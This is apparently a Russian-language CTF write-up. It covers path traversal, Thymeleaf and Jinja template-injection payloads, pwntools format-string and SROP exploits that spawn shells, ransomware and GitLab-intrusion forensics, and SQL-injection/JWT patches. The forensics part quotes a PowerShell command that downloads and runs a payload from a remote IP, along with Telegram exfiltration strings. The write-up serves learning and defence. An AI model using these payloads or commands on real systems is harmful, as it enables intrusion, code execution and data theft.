# web1

Веб-сервис на странице /download предоставляет возмоность через аргумент file_type вводить имя файла, которое мы хотим получить в папке ресурсов на сервере. Эксплуатируя уязвимость Path Traversal, мы можем прочесть любой файл на сервере, в частности etc/secret, в котором и лежит флаг:

```jsx
curl http://192.168.12.10:5001/download?file_type=../../../etc/secret
```

FLAG: nto{P6t9_T77v6RsA1}




# web2

Представленный веб-сервис использует фреймворк Spring Boot, который в частности использует thymeleaf для генерации шаблонов. При некорректном использовании позволяет атакующему выполнять любое действие на сервере. 

[https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability)

Проанализируем код приложения, декомпилированный с помощью jadx-gui

```jsx
@Controller
/* loaded from: src.jar:BOOT-INF/classes/com/server/HelloController.class */
public class HelloController {
    @GetMapping({"/"})
    public String index(Model model) {
        model.addAttribute("Доброе утро!", ":)");
        return "welcome";
    }

    @GetMapping({"/doc/{document}"})
    public void getDocument(@PathVariable String document) {
        System.out.println("This function is not ready yet");
    }

    @GetMapping({"/login"})
    public String login(@RequestParam String password) {
        String adminPassword = SpringInputPasswordFieldTagProcessor.PASSWORD_INPUT_TYPE_ATTR_VALUE;
        String flag = "flag";
        try {
            Scanner scanner = new Scanner(new File("password.txt"));
            adminPassword = scanner.nextLine();
            scanner.close();
        } catch (Exception e) {
            System.out.println(e.toString());
        }
        if (Objects.equals(adminPassword, password)) {
            try {
                Scanner scanner2 = new Scanner(new File("flag"));
                flag = scanner2.nextLine();
                scanner2.close();
            } catch (Exception e2) {
                throw new RuntimeException(e2);
            }
        }
        return flag;
    }
}
```

Фактически, при запросе на `/login?password=hwr`, сервер кладет в переменную `adminPassword` пароль из файла `password.txt`, а в случае отсутствия кладет туда значение `SpringInputPasswordFieldTagProcessor.PASSWORD_INPUT_TYPE_ATTR_VALUE`, что на самом деле просто строка `"password"`

Далее он сравнивает поданное в аргумент `password` значение и  
содержимое `adminPassword`, и если они равны - отдает флаг

Следовательно нужно удалить `password.txt`, а потом обратится на `/login?password=password`

Далее, в статье указанной выше видим эксплойт для ровно такого же функционала по пути `/doc`, модифицируем для удаления пароля, URL-кодируем, совершаем запрос:

```jsx
GET /doc/__%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22rm%20password.txt%22%29%7D__%3A%3A.xHTTP/1.1
```

Далее, идем на страницу `/login?password=password`,  видим флаг

```html
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Thu Mar 21 07:33:12 UTC 2024
There was an unexpected error (type=Internal Server Error, status=500).
Error resolving template [nto{abobovichasdfas}], template might not exist or might not be accessible by any of the configured Template Resolvers
```

FLAG: nto{abobovichasdfas}




# web3

Проанализировав исходный код сервиса, ставим перед собой две задачи:

1) Обойти `ACL` HAProxy из `haproxy.cfg`:

```powershell
acl restricted_page path_beg,url_dec -i /flag
http-request deny if restricted_page
```

Это достигается обращением на URL `//flag`.

2) Обойти Python sandbox на endpoint’e `/flag`:

```python
forbidden_symbols = ['|join', '[', ']', '(', ')', 'mro', 'base', 'class', ',', '{{', '}}']

def contains_forbidden_symbols(word):
    return any(symbol in word for symbol in forbidden_symbols)

def sanitize_input(payload):
    words = re.findall(r'\w+', payload)
    return any(contains_forbidden_symbols(word) for word in words)
```

`render_template_string` из Jinja исполняет пользовательский ввод (произвольный код), однако перед этим санитизирует его.

Сформируем следующую полезную нагрузку: `{{url_for.__globals**__**.os.popen("cat+flag.txt").read()}}`

Она позволит подставить вместо имени пользователя содержимое файла `flag.txt`

Итоговый запрос выглядит следующим образом:

```python
GET //flag?name={{url_for.__globals**__**.os.popen("cat+flag.txt").read()}} HTTP/1.1
```

Получаем флаг: **`nto{Ht1P_sM088Lin6_88Ti}`**




# pwn1

Нам дан файл `main`, посмотрим что он из себя представляет, 

```bash
file main
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8e276da154d4dc6cd38651cd352286ab3b28768d, for GNU/Linux 4.4.0, not stripped
```

ELF-бинарник, 64 битный, круть

Закинем в дизассемблер, (в частности, ghidra)

Есть пара фунцкий, нас интересуют: `main`, `win`

Gосмотрим на декомпиль 

В `win` можем увидеть вызов шелла, так что фактически задача сводится к перенаправлению программы сюда [0x00401156]:

```c
void win(void)

{
  system("/bin/sh");
  return;
}
```

Декпомпиль `main` выглядит следующим образом:

```c

void main(void)

{
  long in_FS_OFFSET;
  char local_418 [1032];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  fgets(local_418,0x400,stdin);
  printf(local_418);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Фактически, уязвимость тут состоит в том, что мы вызываем функцию `printf` без спецификатора формата, что позволяет нам записывать данные в память, используя спецификатор `%n`, он вместо вывода чего-то со стека в нужном формате, записывает по адресу лежащему на нем количество уже введенных символов.

После вызова `printf` вызывается только `exit` , так что нам будет удобнее всего перезаписать адрес exit в GOT-табличке на адрес `win` 

Запустим наш бинарь, посмотрим после какого элемента на стеке идет наш буфер:

```bash
./main
%p %p %p %p %p %p %p %p
0x1e252a1 0x18 0x7f37a0977a5d 0x1e252b8 0x410 **0x7025207025207025** 0x2520702520702520 0xa70252070252070
```

С шестого!

Напишем сплойт:

```python
from pwn import *
context.log_level = "debug"
import time

elf = ELF('./main')
exit_got = elf.got['exit']
win = elf.sym['win']

print(hex(exit_got)) #0x404018
print(hex(win)) #0x401156

# p = process("./main")
p = remote("192.168.12.13", 1923)

payload = b""
payload += b"%4198742c"
payload += b"%8$naaa"
payload += b"\x18\x40\x40\x00\x00\x00\x00\x00"

p.sendline(payload)

p.interactive()

```

Фактически мы кладем наш пейлоад на 6,7,8 место на стеке, при том `printf` с помощью магии спецификаторов формата выводит 4198742 пробелов, что равняется 0x401156, те нашему адресу, а потом кладет это в 8 элемет на стеке, те адрес записи `exit` в GOT-таблице

Запускаем сплойт, получаем шелл, `cat flag`

FLAG: nto{easy_formt_string}




# pwn2

Фактически, предоставленный бинарь полностью соответствует бинарю из таска “Moving Strings” 0x4141414141 CTF, [ разбор на него: [https://ret2home.github.io/blog/CTF/0x41414141-pwn/](https://ret2home.github.io/blog/CTF/0x41414141-pwn/) ], лишь упрощен наличием строки /bin/bash в отдельном файле `vuln`, а также секцией для написания шеллкода

Фактически имеет в себе syscall read(), не имеет канарейки или чего-либо еще. 

```bash
objdump task -D 

task:     file format elf64-x86-64

Disassembly of section .note.gnu.property:

0000000000400190 <__bss_start-0xe70>:
  400190:       04 00                   add    $0x0,%al
  400192:       00 00                   add    %al,(%rax)
  400194:       20 00                   and    %al,(%rax)
  400196:       00 00                   add    %al,(%rax)
  400198:       05 00 00 00 47          add    $0x47000000,%eax
  40019d:       4e 55                   rex.WRX push %rbp
  40019f:       00 01                   add    %al,(%rcx)
  4001a1:       00 01                   add    %al,(%rcx)
  4001a3:       c0 04 00 00             rolb   $0x0,(%rax,%rax,1)
  4001a7:       00 01                   add    %al,(%rcx)
  4001a9:       00 00                   add    %al,(%rax)
  4001ab:       00 00                   add    %al,(%rax)
  4001ad:       00 00                   add    %al,(%rax)
  4001af:       00 02                   add    %al,(%rdx)
  4001b1:       00 01                   add    %al,(%rcx)
  4001b3:       c0 04 00 00             rolb   $0x0,(%rax,%rax,1)
  4001b7:       00 01                   add    %al,(%rcx)
  4001b9:       00 00                   add    %al,(%rax)
  4001bb:       00 00                   add    %al,(%rax)
  4001bd:       00 00                   add    %al,(%rax)
        ...

Disassembly of section .shellcode:

0000000000041000 <__start>:
   41000:       48 c7 c7 00 00 00 00    mov    $0x0,%rdi
   41007:       48 89 e6                mov    %rsp,%rsi
   4100a:       48 83 ee 08             sub    $0x8,%rsi
   4100e:       48 c7 c2 f4 01 00 00    mov    $0x1f4,%rdx
   41015:       0f 05                   syscall
   41017:       c3                      ret
   41018:       58                      pop    %rax
   41019:       c3                      ret
                                             
```

Ну и соответственно сплойт под него тоже подходит, он довольно хорошо описан в статье:

The attack overview:

1. cause BOF
2. put 0xf (syscall number of `rt_sigreturn`) into rax
3. return to `0x41015`, and cause sigreturn.
4. inject shellcode into `0x41017`
5. execute shellcode
6. get the shell!

```bash
from pwn import *
elf=context.binary=ELF("./task")
p=remote("192.168.12.13", 1555)

flame=SigreturnFrame()
flame.rax=0x0
flame.rdi=0x0
flame.rsi=0x00041017
flame.rdx=0x500
flame.rip=0x00041015
flame.rsp=0x00041100

payload=p64(0)
payload+=p64(0x00041018) # pop rax; ret;
payload+=p64(0xf)
payload+=p64(0x00041015) # syscall
payload+=bytes(flame)

p.sendline(payload)
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

Запускаем сплойт, получаем шелл, `cat flag` :

FLAG: nto{sropsropsroplazy}





# Windows Forensics

## Каким образом вредоносное ПО попало на компьютер пользователя?

Из легенды узнаем, что пользователь скачал ВПО из рассылки в почте. Воспользуемся программой Autopsy и дампом почты, чтобы обнаружить, что пользователь скачал следующий архив:

![https://i.imgur.com/rkKhna0.png](https://i.imgur.com/rkKhna0.png)

## С помощью какой уязвимости данное ВПО запустилось? В каком ПО?

После непродолжительных поисков находим во временной директории пользователя папку с разархивированным содержимым архива, а после использования утилиты WinPrefetchView находим, что cmd.exe запустил командлет `TOP_SECRET.PDF .CMD` видим :

![https://i.imgur.com/qjeClzt.png](https://i.imgur.com/qjeClzt.png)

Несмотря на то, что они зашифрованы, по названию (`TOP_SECRET.pdf .cmd`) можно определить, какая уязвимость привела к исполнению вредоносного файла. В [WinRAR присутствует недоработка](https://habr.com/ru/articles/797127/), благодаря которой пользователь нажимает на файл-приманку (в данном случае `TOP_SECRET.pdf`, скачанный из почты), а вместе с ним исполняется файл злоумышленника (набор инструкций командной строки). 

## С какого сервера была скачана полезная нагрузка?

Находим по пути `C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx` лог PowerShell’а, в котором обнаруживаем команду, которой был закачан пэйлоад:

```powershell
powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); Start-Process -Verb runAs $drop
```

Обнаруживаем адрес сервера `95.169.192.220:8080`, название полезной нагрузки и скачиваем его для дальнейшего анализа.

## Какие методы противодействия отладке использует программа?

После использования VirusTotal, Triage и пр. сервисов для статического и динамического анализа (а также пройдясь по программе с использованием дебаггера x64dbg), обнаруживаем, что во-первых, вредонос вызывает метод из Win32 API, чтобы проверить, прикреплён ли к нему дебаггер, а также проверяет имя исполняемого файла, сравнивая его со своим black-листом, и убивая процесс, если он из black-листа. 

![https://i.imgur.com/6D133rf.png](https://i.imgur.com/6D133rf.png)

## Какой алгоритм шифрования используется при шифровании данных?

Статический анализ используемой в бинарном файле библиотеки `CryptoPP` и динамический анализ данных приложения на стеке при исполнении показал, что для шифрования данных используется AES-CBC с размером ключа в 256 бит (32 байта).

## Какой ключ шифрования используется при шифровании данных?

Снимем дамп памяти процесса при помощи Task Manager’a / Process Hacker’a (обойдя систему обнаружения отладки переименованием исполняемого файла). Откроем в HEX-редакторе и поищем по регулярному выражению `\w{32}` - 32 человекочитаемых байта, потенциальный ключ. Обнаружим строку с повторяющимся `sugoma` (перевернутым названием ВПО `amogus`) длиной ровно 32 байта и соседствующую с ней строку `abababababababab`. Предположим, что это IV алгоритма.
![https://i.imgur.com/aP3nrZN.png](https://i.imgur.com/aP3nrZN.png)

## Каково содержимое расшифрованного файла pass.txt на рабочем столе?

Строка с `sugoma` в действительности является перевернутым ключом. В таком случаем файл `pass.txt.ransom` на рабочем столе расшифровывается и мы получаем пароль пользователя:

![https://i.imgur.com/Xfng6cI.png](https://i.imgur.com/Xfng6cI.png)

## Куда злоумышленник отсылает собранные данные? Каким образом он аутентифицируется на endpoint?

При анализе вредоноса с использованием динамического анализа (VirusTotal, Triage), а также прогнав его через дебаггер, замечаем, что ВПО делает запросы к `api.telegram.org`

В частности, можно вытащить следующие строчки:

```jsx
"Content-Type: multipart/form-data; boundary=$$OkRp7n8iB0bFCrsyoCQaQaJY2wM48VIh$$"
"--$$QH43mDbeu3sCCoI0MLnD6AweAdJQwN5E$$\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n6591405725\r\n--$$QH43mDbeu3sCCoI0MLnD6AweAdJQwN5E$$\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{ab942673-d5a2-11ee-b27c-806e6f6e6963}\r\n--$$QH43mDbeu3sCCoI0MLnD6AweAdJQwN5E$$\r\nContent-Disposition: form-data; name=\"document\"; filename=\"info.txt\"\r\nContent-Type: text/plain\r\n\r\n"
"--$$QH43mDbeu3sCCoI0MLnD6AweAdJQwN5E$$\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n6591405725\r\n--$$QH43mDbeu3sCCoI0MLnD6AweAdJQwN5E$$\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{ab942673-d5a2-11ee-b27c-806e6f6e6963}\r\n--$$QH43mDbeu3sCCoI0MLnD6AweAdJQwN5E$$\r\nContent-Disposition: form-data; name=\"document\"; filename=\"info.txt\"\r\nContent-Type: text/plain\r\n\r\nVAuAZMIKCCVmql6Q9tnmfdc0rcpaV3fH8UTr1gaQC6gATsRHeTDSbibm1mDo7OlDsKptwhOfad1iy5DLHiGShcki1T7m5w2gPlkZw0/Tm"
```

Из спецификации API Telegram для ботов понимаем, что это - запрос на отправку сообщения пользователю с ID `6591405725`. Также, ВПО подтягивает токен для бота, но нам не удалось его достать.




# Linux Forensics

## Какой сервис на данном сервере уязвим? Какая версия?

GitLab, 15.2.2.

## Какой тип уязвимости использовал злоумышленник?

Данная версия GitLab подвержена уязвимости CWE-74 (из отчёта GitLab: `“Improper neutralization of special elements used in a command (‘command injection’) in GitLab”`), что фактически предоставляет RCE от имени пользователя `git` с шеллом `/bin/sh`.

## Какие ошибки были допущены при конфигурации сервера?

В файле sudoers лежит строчка `git     ALL=NOPASSWD: /usr/bin/git`, которая позволяет запускать git от имени рута, что делает систему уязвимой. 

## Как злоумышленник повысил привилегии?

Через описанную выше уязвимость. Пример полезной нагрузки: [https://gtfobins.github.io/gtfobins/git/](https://gtfobins.github.io/gtfobins/git/)

## Как злоумышленник получил доступ к серверу на постоянной основе?

На машину был прокинут SSH-ключ (публичный). Ключ положили в `/root/.ssh/authorized_keys`. Ключ: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKXFjUp2LlKAsLvM1PZE7CYEfztiZrOf8PHx9ja1mu2 amongus@debian`

## Как злоумышленник просканировал систему?

Злоумышленник использовал LinPEAS, информация осталась в логах.

## С помощью какого ВПО злоумышленник закрепился на сервере?

Jynx Rootkit/2.0. В директории /root остался скрипт, который подгружал Base64-закодированную полезную нагрузку от [https://github.com/chokepoint/Jynx2](https://github.com/chokepoint/Jynx2). Скрин декоднутой полезной нагрузки:
![https://i.imgur.com/D6xSY4G.png](https://i.imgur.com/D6xSY4G.png)




# Vulnerability Patching

Данный фрагмент кода на Python из auth_api.py уязвим к SQL-инъекции:

python sql_query = "UPDATE user SET pw = '" + str(new_password) + "' WHERE login = '" + str(username) + "';" update_cursor.execute(sql_query)

Патч с использованием безопасной подстановки:

python update_cursor.execute("UPDATE user SET pw = ? WHERE login = ?;", (new_password, username))



В Python auth_api.py недостаточно защищенно проверяется корректность JWT:

python jwt_options = { 'verify_signature': True, 'verify_exp': True, 'verify_nbf': False, 'verify_iat': False, 'verify_aud': False } try: data = jwt.decode(token, current_app.config.get('SECRET_KEY'), algorithms=['HS256'], options=jwt_options)

Для патча необходимо заменить значения у nbf и iat на True

